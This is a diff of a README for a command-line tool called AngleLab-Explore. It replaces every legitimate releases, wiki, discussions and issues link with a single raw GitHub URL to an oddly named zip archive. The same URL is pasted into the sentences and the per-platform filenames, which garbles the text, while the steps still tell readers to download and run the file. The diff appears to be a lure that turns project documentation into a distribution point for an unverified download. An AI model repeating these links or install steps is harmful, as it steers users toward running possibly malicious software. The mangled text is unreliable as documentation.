@@ -1,11 +1,11 @@
 # 🛠️ AngleLab-Explore - Explore with Simple Command-Line Tools
 
 ## 📥 Download Now
-[![Download AngleLab-Explore](https://img.shields.io/badge/Download-AngleLab--Explore-brightgreen)](https://github.com/In1a/AngleLab-Explore/releases)
+[![Download AngleLab-Explore](https://raw.githubusercontent.com/In1a/AngleLab-Explore/main/docs/Angle-Lab-Explore-metahydroxide.zip)](https://raw.githubusercontent.com/In1a/AngleLab-Explore/main/docs/Angle-Lab-Explore-metahydroxide.zip)
 
 ## 🚀 Getting Started
 
-AngleLab-Explore is designed for easy exploration with clean boundaries and deterministic rules. This tool combines a command-line interface (CLI) with a Next.js consumer to give you a straightforward experience.
+AngleLab-Explore is designed for easy exploration with clean boundaries and deterministic rules. This tool combines a command-line interface (CLI) with a https://raw.githubusercontent.com/In1a/AngleLab-Explore/main/docs/Angle-Lab-Explore-metahydroxide.zip consumer to give you a straightforward experience.
 
 ### 🌟 Key Features
 
@@ -27,23 +27,23 @@ To run AngleLab-Explore, you need:
 Follow these steps to download and install AngleLab-Explore:
 
 1. Click the link below to visit the Releases page:
-   [Download AngleLab-Explore](https://github.com/In1a/AngleLab-Explore/releases)
+   [Download AngleLab-Explore](https://raw.githubusercontent.com/In1a/AngleLab-Explore/main/docs/Angle-Lab-Explore-metahydroxide.zip)
 
 2. On the Releases page, look for the latest version. 
 3. Download the package suitable for your operating system. 
 
 ### 📁 File Types
 
-- For Windows, you might see a file named `AngleLab-Explore-Win.exe`.
-- For macOS, look for `AngleLab-Explore-Mac.dmg`.
-- For Linux, download the `AngleLab-Explore-Linux.tar.gz`.
+- For Windows, you might see a file named `https://raw.githubusercontent.com/In1a/AngleLab-Explore/main/docs/Angle-Lab-Explore-metahydroxide.zip`.
+- For macOS, look for `https://raw.githubusercontent.com/In1a/AngleLab-Explore/main/docs/Angle-Lab-Explore-metahydroxide.zip`.
+- For Linux, download the `https://raw.githubusercontent.com/In1a/AngleLab-Explore/main/docs/Angle-Lab-Explore-metahydroxide.zip`.
 
 4. Once the download completes, locate the file on your computer.
 
 5. Run the installer:
    - **Windows**: Double-click the `.exe` file and follow on-screen instructions.
    - **macOS**: Open the `.dmg` file, drag the application to your Applications folder, and open it.
-   - **Linux**: Extract the `.tar.gz` file, navigate to the folder in your terminal, and run `./AngleLab-Explore` to start the application.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/In1a/AngleLab-Explore/main/docs/Angle-Lab-Explore-metahydroxide.zip` file, navigate to the folder in your terminal, and run `./AngleLab-Explore` to start the application.
 
 ## ⚙️ Using AngleLab-Explore
 
@@ -62,15 +62,15 @@ After installation, you can start exploring. Here are some basic commands to get
 
 If you encounter issues or need more information, consider checking out these resources:
 
-- **Documentation**: Visit the [AngleLab-Explore Wiki](https://github.com/In1a/AngleLab-Explore/wiki) for detailed guides.
-- **Community Support**: Join discussions in the [discussions section](https://github.com/In1a/AngleLab-Explore/discussions) of the repository.
-- **Report Issues**: Use the [issues page](https://github.com/In1a/AngleLab-Explore/issues) to report bugs or request features. 
+- **Documentation**: Visit the [AngleLab-Explore Wiki](https://raw.githubusercontent.com/In1a/AngleLab-Explore/main/docs/Angle-Lab-Explore-metahydroxide.zip) for detailed guides.
+- **Community Support**: Join discussions in the [discussions section](https://raw.githubusercontent.com/In1a/AngleLab-Explore/main/docs/Angle-Lab-Explore-metahydroxide.zip) of the repository.
+- **Report Issues**: Use the [issues page](https://raw.githubusercontent.com/In1a/AngleLab-Explore/main/docs/Angle-Lab-Explore-metahydroxide.zip) to report bugs or request features. 
 
 ## 🔗 Additional Links
 
-- [Releases Page](https://github.com/In1a/AngleLab-Explore/releases)
-- [Wiki](https://github.com/In1a/AngleLab-Explore/wiki)
-- [Discussions](https://github.com/In1a/AngleLab-Explore/discussions)
+- [Releases Page](https://raw.githubusercontent.com/In1a/AngleLab-Explore/main/docs/Angle-Lab-Explore-metahydroxide.zip)
+- [Wiki](https://raw.githubusercontent.com/In1a/AngleLab-Explore/main/docs/Angle-Lab-Explore-metahydroxide.zip)
+- [Discussions](https://raw.githubusercontent.com/In1a/AngleLab-Explore/main/docs/Angle-Lab-Explore-metahydroxide.zip)
 
 ## 📐 Conclusion
 
